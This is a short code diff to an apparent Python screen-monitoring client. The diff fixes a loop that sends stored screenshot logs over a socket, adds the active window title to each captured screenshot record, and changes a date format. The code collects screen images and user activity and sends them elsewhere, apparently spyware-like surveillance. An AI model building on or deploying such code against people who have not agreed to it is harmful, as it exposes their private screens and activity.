@@ -166,7 +166,7 @@ def send_screenshot():
 
     config = init()
     if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
-        for i in SCREENSHOT_LOGS.items():
+        for i in SCREENSHOT_LOGS.keys():
             data_send(GLOBAL_SOCKET, str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
         SCREENSHOT_LOGS = {}
     screen_scheduler = sched.scheduler(time.time, time.sleep)
@@ -266,9 +266,10 @@ class Screenshoter(threading.Thread):
                 second = now.second
                 SCREENSHOT_LOGS['%s-%s-%s_%s_%s_%s' % (year, month, day, hour, minute, second)] = {
                     'screen_bits': screen_bits(),
+                    'title_name': get_window_title(),
                     'width': width,
                     'height': height,
-                    'date': '%s-%s-%s_%s_%s_%s' % (year, month, day, hour, minute, second),
+                    'date': '%s-%s-%s_%s-%s-%s' % (year, month, day, hour, minute, second),
                 }
 
                 time.sleep(delay)
